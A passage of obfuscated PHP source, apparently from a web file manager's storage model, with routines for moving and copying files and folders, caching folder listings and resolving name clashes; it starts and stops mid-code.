$Õì°İ° = array(); foreach ($Ş»–´ÔÕ as $ŸÆØ³Ã) { $ÉÑ›‚‚Á = $ŸÆØ³Ã[$¨˜Û´¼[32]] . $¨˜Û´¼[8] . $ŸÆØ³Ã[$¨˜Û´¼[523]]; $¥÷Â”àÓ[$ÉÑ›‚‚Á] = $ŸÆØ³Ã[$¨˜Û´¼[405]]; } foreach ($ÇÛŠø”ç as $ŸÆØ³Ã) { $ÉÑ›‚‚Á = $ŸÆØ³Ã[$¨˜Û´¼[32]] . $¨˜Û´¼[8] . $ŸÆØ³Ã[$¨˜Û´¼[523]]; $²ú¦Ë¢¹ = $¥÷Â”àÓ[$ÉÑ›‚‚Á]; $Õì°İ°[$²ú¦Ë¢¹] = $ŸÆØ³Ã[$¨˜Û´¼[405]]; } return $Õì°İ°; } private function _childrenMatch($ñÖÉ…‹, $³ŒÉ•’, $í¿à”¾Ö) { $ö»œ¤ä =& $_SERVER[Æ š¦İÈ]; $¡Ú§Ù£Â = $í¿à”¾Ö[$ö»œ¤ä[523]]; $¨›…Í²ü = $this->parentLevelArray($³ŒÉ•’[$ö»œ¤ä[523]]); foreach ($¨›…Í²ü as $®Ÿ¿š¸‡) { if (isset($ñÖÉ…‹[$®Ÿ¿š¸‡])) { $¡Ú§Ù£Â .= $ñÖÉ…‹[$®Ÿ¿š¸‡] . $ö»œ¤ä[578]; } } $¡Ú§Ù£Â = rtrim($¡Ú§Ù£Â, $ö»œ¤ä[50]) . $ö»œ¤ä[50]; $©îÒ„™ = $this->parentLevelArray($¡Ú§Ù£Â); $”İâçÇ® = $©îÒ„™[count($©îÒ„™) - 1]; return array($ö»œ¤ä[500] => $”İâçÇ®, $ö»œ¤ä[523] => $¡Ú§Ù£Â); } private function _makeItemData($Áú±óİ, $Ã§Èƒãô, $ÕïşÛİ§) { $ìªş©µÁ =& $_SERVER[Æ š¦İÈ]; $áí‚Àë¥ = array($ìªş©µÁ[579] => $Áú±óİ[$ìªş©µÁ[413]], $ìªş©µÁ[423] => $ÕïşÛİ§, $ìªş©µÁ[580] => $Áú±óİ[$ìªş©µÁ[415]] ? $Áú±óİ[$ìªş©µÁ[415]] : $ìªş©µÁ[12], $ìªş©µÁ[470] => $Áú±óİ[$ìªş©µÁ[469]] ? $Áú±óİ[$ìªş©µÁ[469]] : 0, $ìªş©µÁ[581] => $Áú±óİ[$ìªş©µÁ[80]] ? $Áú±óİ[$ìªş©µÁ[80]] : 0, $ìªş©µÁ[582] => intval($Ã§Èƒãô[$ìªş©µÁ[414]]), $ìªş©µÁ[583] => intval($Ã§Èƒãô[$ìªş©µÁ[506]]), $ìªş©µÁ[584] => intval(USER_ID), $ìªş©µÁ[585] => intval(USER_ID), $ìªş©µÁ[404] => intval($Ã§Èƒãô[$ìªş©µÁ[405]]), $ìªş©µÁ[586] => $Ã§Èƒãô[$ìªş©µÁ[523]] . $Ã§Èƒãô[$ìªş©µÁ[405]] . $ìªş©µÁ[50], $ìªş©µÁ[427] => $Áú±óİ[$ìªş©µÁ[86]] ? $Áú±óİ[$ìªş©µÁ[86]] : time(), $ìªş©µÁ[432] => 0, $ìªş©µÁ[587] => $ìªş©µÁ[12]); return $áí‚Àë¥; } private function _copyApplyMeta($øñ°µñå, &$“º«ıÌÚ) { $¯íäµ­ =& $_SERVER[Æ š¦İÈ]; $“Ç¿ÀİÂ = $øñ°µñå[$¯íäµ­[405]]; $ôä†ùÍ‰ = $øñ°µñå[$¯íäµ­[32]]; if (!isset($øñ°µñå[$¯íäµ­[588]]) || !$øñ°µñå[$¯íäµ­[588]] || $øñ°µñå[$¯íäµ­[588]] == $¯íäµ­[192]) { $“º«ıÌÚ[$¯íäµ­[564]][] = array($¯íäµ­[405], $“Ç¿ÀİÂ, $¯íäµ­[588], short_id($“Ç¿ÀİÂ)); } if (Input::check($ôä†ùÍ‰, $¯íäµ­[589])) { $“º«ıÌÚ[$¯íäµ­[563]][] = array($¯íäµ­[405] => $“Ç¿ÀİÂ, $¯íäµ­[95] => $¯íäµ­[466], $¯íäµ­[371] => str_replace($¯íäµ­[53], $¯íäµ­[12], Pinyin::get($ôä†ùÍ‰))); $“º«ıÌÚ[$¯íäµ­[563]][] = array($¯íäµ­[405] => $“Ç¿ÀİÂ, $¯íäµ­[95] => $¯íäµ­[465], $¯íäµ­[371] => Pinyin::get($ôä†ùÍ‰, $¯íäµ­[590])); } $“º«ıÌÚ[$¯íäµ­[563]][] = array($¯íäµ­[405] => $“Ç¿ÀİÂ, $¯íäµ­[95] => $¯íäµ­[444], $¯íäµ­[371] => KodSort::makeStr($ôä†ùÍ‰)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($±ø§•ö±) { $‘Ñîª’ =& $_SERVER[Æ š¦İÈ]; $ü†ê§¥Û = $this->sourceInfo($±ø§•ö±); $Œâ¸ÀªÅ = $‘Ñîª’[591]; $¿¼ßÀ‘› = array($‘Ñîª’[523] => array($‘Ñîª’[546], $ü†ê§¥Û[$‘Ñîª’[523]] . $±ø§•ö± . $‘Ñîª’[547]), $‘Ñîª’[433] => $this->targetIsDelete); $·¦”æ’Ä = $this->field($Œâ¸ÀªÅ)->where($¿¼ßÀ‘›)->select(); if (!$·¦”æ’Ä) { return; } $·¦”æ’Ä = array_to_keyvalue($·¦”æ’Ä, $‘Ñîª’[405]); foreach ($·¦”æ’Ä as $òìÉÆû) { $“¸ùşÖë = $òìÉÆû[$‘Ñîª’[500]]; $±ø§•ö± = $òìÉÆû[$‘Ñîª’[405]]; if (!isset($this->_childrenListCache[$±ø§•ö±]) && $òìÉÆû[$‘Ñîª’[413]] == $‘Ñîª’[89]) { $this->_childrenListCache[$±ø§•ö±] = array(); } if (!isset($this->_childrenListCache[$“¸ùşÖë])) { $this->_childrenListCache[$“¸ùşÖë] = array(); } $this->_childrenListCache[$“¸ùşÖë][$±ø§•ö±] = $òìÉÆû; $this->_childrenItemCache[$±ø§•ö±] = $òìÉÆû; } } private function _childrenListAll($ß¥£èŠ­, &$ ƒë‡ı¼) { $Ó”É“ñà =& $_SERVER[Æ š¦İÈ]; if (!isset($this->_childrenListCache[$ß¥£èŠ­])) { return; } $ûÓĞ‘µ = $this->_childrenListCache[$ß¥£èŠ­]; foreach ($ûÓĞ‘µ as $Ÿâæ£È¨ => $£Ô÷·å³) { $ ƒë‡ı¼[$Ÿâæ£È¨] = $£Ô÷·å³; if ($£Ô÷·å³[$Ó”É“ñà[413]] == $Ó”É“ñà[89]) { $this->_childrenListAll($Ÿâæ£È¨, $ ƒë‡ı¼); } } } private function sourceInfoCache($¬ùÓò—•) { if (isset($this->_childrenItemCache[$¬ùÓò—•])) { return $this->_childrenItemCache[$¬ùÓò—•]; } return $this->sourceInfo($¬ùÓò—•); } private function _childrenList($²²«¶»ñ) { if (isset($this->_childrenListCache[$²²«¶»ñ])) { return $this->_childrenListCache[$²²«¶»ñ]; } return $this->_childrenListSelect($²²«¶»ñ); } private function _childrenListSelect($ØúÉ–¿·) { $ƒá¦±×¸ =& $_SERVER[Æ š¦İÈ]; $£Ãâ¨î = array($ƒá¦±×¸[500] => $ØúÉ–¿·, $ƒá¦±×¸[433] => $this->targetIsDelete); $¥ïææ¸ = $this->where($£Ãâ¨î)->select(); $¥ïææ¸ = $¥ïææ¸ ? $¥ïææ¸ : array(); $æàù×ƒî = array_to_keyvalue($¥ïææ¸, $ƒá¦±×¸[405]); $this->_childrenListCache[$ØúÉ–¿·] = $æàù×ƒî; foreach ($æàù×ƒî as $ØúÉ–¿· => $òÇ÷‚¾) { $this->_childrenItemCache[$ØúÉ–¿·] = $òÇ÷‚¾; } return $æàù×ƒî; } private function fileNameExistCache($˜œÙÍ±, $ëÃåµ) { $“¡Í¼ßÓ =& $_SERVER[Æ š¦İÈ]; $ëÃåµ = strtolower($ëÃåµ); $„ÛÎ¨é¤ = $this->_childrenList($˜œÙÍ±); foreach ($„ÛÎ¨é¤ as $ãä×Ö÷) { if ($ëÃåµ == strtolower($ãä×Ö÷[$“¡Í¼ßÓ[32]])) { return $ãä×Ö÷[$“¡Í¼ßÓ[405]]; } } return !1; } private function fileNameAutoCache($üàÙà“‹, $å½™Éë¹, $ÎÔÉÜ«, $Êü™û€) { $‚×îÙĞ =& $_SERVER[Æ š¦İÈ]; $ö¾»ßôÃ = $this->_childrenList($üàÙà“‹); $Åé­©ŞÖ = array_to_keyvalue($ö¾»ßôÃ, $‚×îÙĞ[12], $‚×îÙĞ[32]); return $this->fileNameAutoGet($Åé­©ŞÖ, $å½™Éë¹, $ÎÔÉÜ«, $Êü™û€); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Æš¦ŸŠ«, $¥™¶Áîß, $£ÆœëÔæ = REPEAT_REPLACE, $ëˆ³Ì¸« = '') { $ÃéŞŠ¸Õ =& $_SERVER[Æ š¦İÈ]; $íçµĞÀÍ = $this->sourceInfo($Æš¦ŸŠ«); $âñçç¾“ = $this->sourceInfo($¥™¶Áîß); if ($íçµĞÀÍ[$ÃéŞŠ¸Õ[500]] == $âñçç¾“[$ÃéŞŠ¸Õ[405]]) { if ($íçµĞÀÍ[$ÃéŞŠ¸Õ[433]] == $ÃéŞŠ¸Õ[89]) { Model($ÃéŞŠ¸Õ[431])->restore(array($Æš¦ŸŠ«)); } if (!$ëˆ³Ì¸« || $ëˆ³Ì¸« == $íçµĞÀÍ[$ÃéŞŠ¸Õ[32]]) { return $Æš¦ŸŠ«; } } $øëÀßÏõ = $this->pathInfoMore($Æš¦ŸŠ«); if ($this->isParentOf($Æš¦ŸŠ«, $¥™¶Áîß)) { return !1; } if (!$íçµĞÀÍ || !$âñçç¾“ || $âñçç¾“[$ÃéŞŠ¸Õ[413]] != $ÃéŞŠ¸Õ[89]) { return !1; } Hook::trigger($ÃéŞŠ¸Õ[592], $øëÀßÏõ); $this->targetIsDelete = intval($íçµĞÀÍ[$ÃéŞŠ¸Õ[433]]); if ($íçµĞÀÍ[$ÃéŞŠ¸Õ[500]] == $¥™¶Áîß && $ëˆ³Ì¸« != $íçµĞÀÍ[$ÃéŞŠ¸Õ[32]]) { $öÑıˆö´ = $this->fileNameExist($¥™¶Áîß, $ëˆ³Ì¸«); if ($öÑıˆö´ && $íçµĞÀÍ[$ÃéŞŠ¸Õ[413]] == $ÃéŞŠ¸Õ[192]) { $ğßÔüÄ = $this->sourceInfo($öÑıˆö´); $ğ†œîøŠ = $this->fileHistory($ğßÔüÄ, $íçµĞÀÍ[$ÃéŞŠ¸Õ[469]], $íçµĞÀÍ[$ÃéŞŠ¸Õ[80]]); if (!$ğ†œîøŠ) { Model($ÃéŞŠ¸Õ[472])->remove($íçµĞÀÍ[$ÃéŞŠ¸Õ[469]]); } $this->removeNow($Æš¦ŸŠ«, !1); $this->folderSizeReset($¥™¶Áîß); Hook::trigger($ÃéŞŠ¸Õ[593], $øëÀßÏõ); return $öÑıˆö´; } } $ÒÆ¶¯‘Ò = $ëˆ³Ì¸« ? $ëˆ³Ì¸« : $íçµĞÀÍ[$ÃéŞŠ¸Õ[32]]; $this->lockMoveStart($Æš¦ŸŠ«); $this->lockWriteStart($¥™¶Áîß, $ÒÆ¶¯‘Ò); $ÆìÆ¨… = array($ÃéŞŠ¸Õ[562] => array(), $ÃéŞŠ¸Õ[594] => !1); $this->clearShare($Æš¦ŸŠ«, $¥™¶Áîß); $´•ßÒƒÑ = $this->fileNameExistCache($¥™¶Áîß, $íçµĞÀÍ[$ÃéŞŠ¸Õ[32]]); $™¾®˜Ç = $this->_move($Æš¦ŸŠ«, $¥™¶Áîß, $£ÆœëÔæ, $ÆìÆ¨…, $ëˆ³Ì¸«); $this->sourceCacheClear(); if ($íçµĞÀÍ[$ÃéŞŠ¸Õ[413]] == $ÃéŞŠ¸Õ[89] && $´•ßÒƒÑ) { $this->folderSizeResetChildren($™¾®˜Ç); } Model($ÃéŞŠ¸Õ[194])->linkAdd($ÆìÆ¨…[$ÃéŞŠ¸Õ[562]]); if ($´•ßÒƒÑ && $ÆìÆ¨…[$ÃéŞŠ¸Õ[594]]) { $this->removeNow($Æš¦ŸŠ«, !1); } $this->lockMoveEnd($Æš¦ŸŠ«); $this->lockWriteEnd($¥™¶Áîß, $ÒÆ¶¯‘Ò); $this->folderSizeReset($íçµĞÀÍ[$ÃéŞŠ¸Õ[500]]); $this->folderSizeReset($¥™¶Áîß); $ß¯›§€ = array($íçµĞÀÍ[$ÃéŞŠ¸Õ[500]], $¥™¶Áîß); if ($íçµĞÀÍ[$ÃéŞŠ¸Õ[413]] == $ÃéŞŠ¸Õ[89]) { $ß¯›§€[] = $Æš¦ŸŠ«; } $this->updateModifyTime($ß¯›§€); Model($ÃéŞŠ¸Õ[566])->eventMove($Æš¦ŸŠ«, $íçµĞÀÍ[$ÃéŞŠ¸Õ[500]], $¥™¶Áîß); Hook::trigger($ÃéŞŠ¸Õ[593], $øëÀßÏõ); return $™¾®˜Ç; } private function _move($ç¶ğ–¹­, $‡¹ÖÜæ, $ŠÊœŠ«¶, &$¨°·¹‘™, $ÉÕºâ¨ = '') { $¿ÈÓ„ğ• =& $_SERVER[Æ š¦İÈ]; $ëº™Â¤Ï = $this->sourceInfo($ç¶ğ–¹­); $ª²Ú¡ñÉ = $ëº™Â¤Ï[$¿ÈÓ„ğ•[413]] == $¿ÈÓ„ğ•[89]; $•óŒ¤‹ = $ÉÕºâ¨ ? $ÉÕºâ¨ : $ëº™Â¤Ï[$¿ÈÓ„ğ•[32]]; $ÈğÍÊÊ = $this->fileNameExistCache($‡¹ÖÜæ, $•óŒ¤‹); $this->lockMoveStart($ç¶ğ–¹­); $this->lockWriteStart($‡¹ÖÜæ, $•óŒ¤‹); if (!$ÈğÍÊÊ) { return $this->_moveForce($ç¶ğ–¹­, $‡¹ÖÜæ, $•óŒ¤‹); } $€‰¸ˆÄ = $ÈğÍÊÊ; $Ê°½ïˆÓ = !1; if ($ª²Ú¡ñÉ) { if ($ŠÊœŠ«¶ == REPEAT_RENAME_FOLDER) { $•óŒ¤‹ = $this->fileNameAuto($‡¹ÖÜæ, $•óŒ¤‹, $ŠÊœŠ«¶, $ª²Ú¡ñÉ); $€‰¸ˆÄ = $this->_moveForce($ç¶ğ–¹­, $‡¹ÖÜæ, $•óŒ¤‹); } else { if ($ŠÊœŠ«¶ == REPEAT_RENAME_FOLDER) { $ŠÊœŠ«¶ = REPEAT_RENAME; } $ì»Ï÷¬– = $this->_childrenListSelect($ç¶ğ–¹­); foreach ($ì»Ï÷¬– as $ß©æŸ·±) { $this->_move($ß©æŸ·±[$¿ÈÓ„ğ•[405]], $ÈğÍÊÊ, $ŠÊœŠ«¶, $¨°·¹‘™); } $Ê°½ïˆÓ = !0; } } else { if ($ŠÊœŠ«¶ == REPEAT_SKIP) { $Ê°½ïˆÓ = !0; } else { if ($ŠÊœŠ«¶ == REPEAT_RENAME || $ŠÊœŠ«¶ == REPEAT_RENAME_FOLDER) { $•óŒ¤‹ = $this->fileNameAuto($‡¹ÖÜæ, $•óŒ¤‹, $ŠÊœŠ«¶, $ª²Ú¡ñÉ); $€‰¸ˆÄ = $this->_moveForce($ç¶ğ–¹­, $‡¹ÖÜæ, $•óŒ¤‹); } else { if ($ŠÊœŠ«¶ == REPEAT_REPLACE) { $İÎÄ†İ¸ = $this->sourceInfoCache($ÈğÍÊÊ); $ù¢¹¡·¥ = $this->fileHistory($İÎÄ†İ¸, $ëº™Â¤Ï[$¿ÈÓ„ğ•[469]], $ëº™Â¤Ï[$¿ÈÓ„ğ•[80]]); $Ê°½ïˆÓ = !0; if ($ù¢¹¡·¥) { $¨°·¹‘™[$¿ÈÓ„ğ•[562]][] = $ëº™Â¤Ï[$¿ÈÓ„ğ•[469]]; } } } } } if ($Ê°½ïˆÓ && !$¨°·¹‘™[$¿ÈÓ„ğ•[594]]) { $¨°·¹‘™[$¿ÈÓ„ğ•[594]] = !0; } return $€‰¸ˆÄ; } private function _moveForce($µÇ¡²øÛ, $ÁÈ‚»±³, $æ†ÈØ¦) { $²Á¼–’æ =& $_SERVER[Æ š¦İÈ]; $óÊİŸäµ = $this->sourceInfo($µÇ¡²øÛ); $®êÓÁƒÚ = $this->sourceInfo($ÁÈ‚»±³); $Çô ¹ß = $óÊİŸäµ[$²Á¼–’æ[413]] == $²Á¼–’æ[89]; $ğ½æ×Ìí = array($²Á¼–’æ[404] => $®êÓÁƒÚ[$²Á¼–’æ[405]], $²Á¼–’æ[586] => $®êÓÁƒÚ[$²Á¼–’æ[523]] . $®êÓÁƒÚ[$²Á¼–’æ[405]] . $²Á¼–’æ[50], $²Á¼–’æ[582] => $®êÓÁƒÚ[$²Á¼–’æ[414]], $²Á¼–’æ[583] => $®êÓÁƒÚ[$²Á¼–’æ[506]], $²Á¼–’æ[585] => USER_ID, $²Á¼–’æ[423] => $æ†ÈØ¦); $âèç‹Ôí = $óÊİŸäµ[$²Á¼–’æ[414]] == SourceModel::TYPE_GROUP && $®êÓÁƒÚ[$²Á¼–’æ[414]] == SourceModel::TYPE_GROUP && $óÊİŸäµ[$²Á¼–’æ[506]] == $®êÓÁƒÚ[$²Á¼–’æ[506]]; if (!$âèç‹Ôí && $this->moveClearAuth) { Model($²Á¼–’æ[504])->authClear($µÇ¡²øÛ); } $óÇ‘ÕéÜ = $óÊİŸäµ[$²Á¼–’æ[433]] == $²Á¼–’æ[89] && $®êÓÁƒÚ[$²Á¼–’æ[433]] != $²Á¼–’æ[89]; if ($óÇ‘ÕéÜ) { $ğ½æ×Ìí[$²Á¼–’æ[432]] = 0; } if ($Çô ¹ß) { $ÌÊÒÂâ© = array($²Á¼–’æ[586] => array($²Á¼–’æ[546], $óÊİŸäµ[$²Á¼–’æ[523]] . $óÊİŸäµ[$²Á¼–’æ[405]] . $²Á¼–’æ[547])); $“âÒêÂ = $óÊİŸäµ[$²Á¼–’æ[523]] . $óÊİŸäµ[$²Á¼–’æ[405]] . $²Á¼–’æ[50]; $ÀÇçƒÌ… = $®êÓÁƒÚ[$²Á¼–’æ[523]] . $®êÓÁƒÚ[$²Á¼–’æ[405]] . $²Á¼–’æ[50] . $óÊİŸäµ[$²Á¼–’æ[405]] . $²Á¼–’æ[50]; $×²‘È£Ë = array($²Á¼–’æ[586] => array($²Á¼–’æ[595], "\162\145\160\154\141\143\x65\50\x70\141\162\145\156\x74\114\x65\166\x65\x6c\54\47{$“âÒêÂ}\x27\x2c\47{$ÀÇçƒÌ…}\47\x29"), $²Á¼–’æ[582] => $®êÓÁƒÚ[$²Á¼–’æ[414]], $²Á¼–’æ[583] => $®êÓÁƒÚ[$²Á¼–’æ[506]]); if ($óÇ‘ÕéÜ) { $×²‘È£Ë[$²Á¼–’æ[432]] = 0; } $this->where($ÌÊÒÂâ©)->data($×²‘È£Ë)->save(); } $this->where(array($²Á¼–’æ[420] => $µÇ¡²øÛ))->data($ğ½æ×Ìí)->save(); return $µÇ¡²øÛ; } private function clearShare($Äˆ†›“´, $Ñ¢ĞëÉ) { $š“Ü˜èı =& $_SERVER[Æ š¦İÈ]; $Ö§”©ª = $this->sourceInfo($Äˆ†›“´); $¸ç‰‘Ô‰ = $this->sourceInfo($Ñ¢ĞëÉ); if ($Ö§”©ª[$š“Ü˜èı[506]] == $¸ç‰‘Ô‰[$š“Ü˜èı[506]] && $Ö§”©ª[$š“Ü˜èı[414]] == $š“Ü˜èı[596]) { return; } $ããéâÑ² = array($š“Ü˜èı[523] => array($š“Ü˜èı[546], $Ö§”©ª[$š“Ü˜èı[523]] . $Äˆ†›“´ . $š“Ü˜èı[547])); $±òÙ¾ å = $this->field($š“Ü˜èı[420])->where($ããéâÑ²)->getField($š“Ü˜èı[405], !0); if (!$±òÙ¾ å) { return; } $ããéâÑ² = array($š“Ü˜èı[405] => array($š“Ü˜èı[7], $±òÙ¾ å), $š“Ü˜èı[497] => 1); $³ï‰ïñ° = Model($š“Ü˜èı[597])->field($š“Ü˜èı[490])->where($ããéâÑ²)->select(); if (!$³ï‰ïñ°) { return; } $³ï‰ïñ° = array_to_keyvalue($³ï‰ïñ°, $š“Ü˜èı[12], $š“Ü˜èı[490]); $ããéâÑ² = array($š“Ü˜èı[490] => array($š“Ü˜èı[7], $³ï‰ïñ°)); Model($š“Ü˜èı[597])->where($ããéâÑ²)->save(array($š“Ü˜èı[497] => 0)); Model($š“Ü˜èı[598])->where($ããéâÑ²)->delete(); } public function copyFolderFromIO($‚ò°ó£, $ÆÊĞ’õë, $ğË®ôõŠ, $¢—ºì¡», $¨Ğı’Œ¬, $§ÊŒá¨Ï = false) { $´¾çéàÛ =& $_SERVER[Æ š¦İÈ]; $€íÈÊ„¼ = array($´¾çéàÛ[563] => array(), $´¾çéàÛ[564] => array(), $´¾çéàÛ[562] => array(), $´¾çéàÛ[599] => array()); $ú«ô¦•á = $§ÊŒá¨Ï ? $§ÊŒá¨Ï : $‚ò°ó£->pathThis($ÆÊĞ’õë); $õÎîÀî = $this->fileNameExist($ğË®ôõŠ, $ú«ô¦•á); $Ô´¬—ª = $this->mkdir($ğË®ôõŠ, $ú«ô¦•á, $¢—ºì¡»); if (!$õÎîÀî || $¢—ºì¡» == REPEAT_RENAME_FOLDER) { $¢—ºì¡» = !1; } if ($õÎîÀî) { $this->_childrenAllMake($õÎîÀî); } Hook::trigger($´¾çéàÛ[600]); $this->_copyChildTo($‚ò°ó£, $ÆÊĞ’õë, $Ô´¬—ª, $¢—ºì¡», $€íÈÊ„¼, $¨Ğı’Œ¬); Hook::trigger($´¾çéàÛ[601]); if ($Ô´¬—ª) { $this->folderSizeResetChildren($Ô´¬—ª); } $this->_childrenListClear(); Model($´¾çéàÛ[565])->addAll($€íÈÊ„¼[$´¾çéàÛ[563]], array(), !0); Model($´¾çéàÛ[566])->eventCopy($Ô´¬—ª); $this->saveAll($€íÈÊ„¼[$´¾çéàÛ[564]]); Model($´¾çéàÛ[472])->linkAdd($€íÈÊ„¼[$´¾çéàÛ[562]]); Model($´¾çéàÛ[472])->remove($€íÈÊ„¼[$´¾çéàÛ[599]]); $this->folderSizeReset($ğË®ôõŠ); $this->updateModifyTime($ğË®ôõŠ); return $Ô´¬—ª; } private function _copyChildTo($¤ßÆ«Ïß, $ùÙ±¸ˆ±, $‰õÈ´à³, $‰¶ˆ¾çÄ, &$Éå©¢Ÿ¨, $÷Ì—ÕÆ») { $¦ÈèÙú =& $_SERVER[Æ š¦İÈ]; $É° –©ï = $this->sourceInfoCache($‰õÈ´à³); $²§ó¹¯¸ = $¤ßÆ«Ïß->listPath($ùÙ±¸ˆ±); $²§ó¹¯¸ = $²§ó¹¯¸ ? $²§ó¹¯¸ : array($¦ÈèÙú[76] => array(), $¦ÈèÙú[77] => array()); $ú¦†Ø¦ = array_merge($²§ó¹¯¸[$¦ÈèÙú[76]], $²§ó¹¯¸[$¦ÈèÙú[77]]); $üÑİ®Ü’ = $this->_addFiles($¤ßÆ«Ïß, $²§ó¹¯¸[$¦ÈèÙú[76]], $÷Ì—ÕÆ»); $Û‚“¶Ö… = array(); foreach ($ú¦†Ø¦ as &$ÎßÀ–ëÇ) { if (isset($üÑİ®Ü’[$ÎßÀ–ëÇ[$¦ÈèÙú[32]]])) { $ÎßÀ–ëÇ = $üÑİ®Ü’[$ÎßÀ–ëÇ[$¦ÈèÙú[32]]]; } $ÎßÀ–ëÇ[$¦ÈèÙú[413]] = $ÎßÀ–ëÇ[$¦ÈèÙú[33]] == $¦ÈèÙú[79]; $ÎßÀ–ëÇ[$¦ÈèÙú[415]] = _get($ÎßÀ–ëÇ, $¦ÈèÙú[169], $¦ÈèÙú[12]); $ÎßÀ–ëÇ[$¦ÈèÙú[80]] = _get($ÎßÀ–ëÇ, $¦ÈèÙú[80], 0); $ÎßÀ–ëÇ[$¦ÈèÙú[469]] = _get($ÎßÀ–ëÇ, $¦ÈèÙú[469], 0); if (!isset($ÎßÀ–ëÇ[$¦ÈèÙú[602]]) && $ÎßÀ–ëÇ[$¦ÈèÙú[469]]) { $Éå©¢Ÿ¨[$¦ÈèÙú[599]][] = $ÎßÀ–ëÇ[$¦ÈèÙú[469]]; } if ($‰¶ˆ¾çÄ) { $¹ÕÏŒüè = $this->fileNameExistCache($‰õÈ´à³, $ÎßÀ–ëÇ[$¦ÈèÙú[32]]); if ($¹ÕÏŒüè) { if ($ÎßÀ–ëÇ[$¦ÈèÙú[413]] || $‰¶ˆ¾çÄ == REPEAT_SKIP) { continue; } if ($‰¶ˆ¾çÄ == REPEAT_REPLACE) { $¹¶¸ÍÍê = $this->sourceInfoCache($¹ÕÏŒüè); $æõËÊÖ¦ = $this->fileHistory($¹¶¸ÍÍê, $ÎßÀ–ëÇ[$¦ÈèÙú[469]], $ÎßÀ–ëÇ[$¦ÈèÙú[80]]); if ($æõËÊÖ¦) { $Éå©¢Ÿ¨[$¦ÈèÙú[562]][] = $ÎßÀ–ëÇ[$¦ÈèÙú[469]]; } continue; } else { if ($‰¶ˆ¾çÄ == REPEAT_RENAME) { $ÎßÀ–ëÇ[$¦ÈèÙú[32]] = $this->fileNameAutoCache($‰õÈ´à³, $ÎßÀ–ëÇ[$¦ÈèÙú[32]], $‰¶ˆ¾çÄ, !1); } } } } if (!$ÎßÀ–ëÇ[$¦ÈèÙú[413]] && $ÎßÀ–ëÇ[$¦ÈèÙú[469]] == 0) { continue; } if (!$ÎßÀ–ëÇ[$¦ÈèÙú[413]] && $ÎßÀ–ëÇ[$¦ÈèÙú[469]]) { $Éå©¢Ÿ¨[$¦ÈèÙú[562]][] = $ÎßÀ–ëÇ[$¦ÈèÙú[469]]; } $Û‚“¶Ö…[] = $this->_makeItemData($ÎßÀ–ëÇ, $É° –©ï, $ÎßÀ–ëÇ[$¦ÈèÙú[32]]); } unset($ÎßÀ–ëÇ); if (!empty($Û‚“¶Ö…)) { $this->addAll($Û‚“¶Ö…); $this->_childrenListSelect($‰õÈ´à³); } $³šÃı©ò = $this->_childrenList($‰õÈ´à³); $³šÃı©ò = array_to_keyvalue($³šÃı©ò, $¦ÈèÙú[32]); foreach ($ú¦†Ø¦ as $ÎßÀ–ëÇ) { $¹¶¸ÍÍê = $³šÃı©ò[$ÎßÀ–ëÇ[$¦ÈèÙú[32]]]; $•‰ş—ú = $¹¶¸ÍÍê[$¦ÈèÙú[405]]; $this->_copyApplyMeta($¹¶¸ÍÍê, $Éå©¢Ÿ¨); if ($ÎßÀ–ëÇ[$¦ÈèÙú[33]] == $¦ÈèÙú[79]) { $ÎßÀ–ëÇ[$¦ÈèÙú[78]] = $¤ßÆ«Ïß->getPathInner($ÎßÀ–ëÇ[$¦ÈèÙú[78]]); $this->_copyChildTo($¤ßÆ«Ïß, $ÎßÀ–ëÇ[$¦ÈèÙú[78]], $•‰ş—ú, $‰¶ˆ¾çÄ, $Éå©¢Ÿ¨, $÷Ì—ÕÆ»); } } } private function _addFiles($àµ¸ŞÀ·, $¦æµôŒÜ, $Ğİ¹È¹) { $•Œğ†ÑÊ =& $_SERVER[Æ š¦İÈ]; if (!$¦æµôŒÜ || count($¦æµôŒÜ) == 0) { return array(); } $ì¢íÉ¸Ø = array(); foreach ($¦æµôŒÜ as &$ùÉ±¶©Ñ) { Hook::trigger($•Œğ†ÑÊ[603], $ùÉ±¶©Ñ); $ùÉ±¶©Ñ[$•Œğ†ÑÊ[78]] = $àµ¸ŞÀ·->getPathInner($ùÉ±¶©Ñ[$•Œğ†ÑÊ[78]]); $ã—æ·şù = $àµ¸ŞÀ·->hashSimple($ùÉ±¶©Ñ[$•Œğ†ÑÊ[78]]); $çÓà¥°í = $àµ¸ŞÀ·->hashMd5($ùÉ±¶©Ñ[$•Œğ†ÑÊ[78]]); if (strlen($çÓà¥°í) > 10 && !isset($ì¢íÉ¸Ø[$çÓà¥°í])) { $ì¢íÉ¸Ø[$çÓà¥°í] = array(); } $ùÉ±¶©Ñ[$•Œğ†ÑÊ[172]] = $ã—æ·şù; $ùÉ±¶©Ñ[$•Œğ†ÑÊ[171]] = $çÓà¥°í; Hook::trigger($•Œğ†ÑÊ[604], $ùÉ±¶©Ñ); $ì¢íÉ¸Ø[$çÓà¥°í][] =& $ùÉ±¶©Ñ; if (count($ì¢íÉ¸Ø[$çÓà¥°í]) > 1) { $ùÉ±¶©Ñ[$•Œğ†ÑÊ[602]] = !0; } } unset($ùÉ±¶©Ñ); $ÌÔ›…­ = array($•Œğ†ÑÊ[171] => array($•Œğ†ÑÊ[7], array_keys($ì¢íÉ¸Ø))); $Š“üè² = Model($•Œğ†ÑÊ[605]); $–†‘ù = $Š“üè²->where($ÌÔ›…­)->select(); $–†‘ù = $–†‘ù ? $–†‘ù : array(); foreach ($–†‘ù as $Œ…â¹ƒ ) { if (!isset($ì¢íÉ¸Ø[$Œ…â¹ƒ [$•Œğ†ÑÊ[171]]])) { continue; } $‹³ô¨““ = $ì¢íÉ¸Ø[$Œ…â¹ƒ [$•Œğ†ÑÊ[171]]]; foreach ($‹³ô¨““ as &$ùÉ±¶©Ñ) { $ùÉ±¶©Ñ[$•Œğ†ÑÊ[469]] = $Œ…â¹ƒ [$•Œğ†ÑÊ[469]]; $ùÉ±¶©Ñ[$•Œğ†ÑÊ[602]] = !0; } unset($ùÉ±¶©Ñ); } $ „€£„¥ = array(); foreach ($¦æµôŒÜ as $ûŒÛæğ¤) { if (isset($ûŒÛæğ¤[$•Œğ†ÑÊ[602]]) && $ûŒÛæğ¤[$•Œğ†ÑÊ[602]]) { continue; } $”§¯Ù = $àµ¸ŞÀ·->getPathInner($ûŒÛæğ¤[$•Œğ†ÑÊ[78]]); $¿˜Å±¸ = $Š“üè²->addFileMake($”§¯Ù, 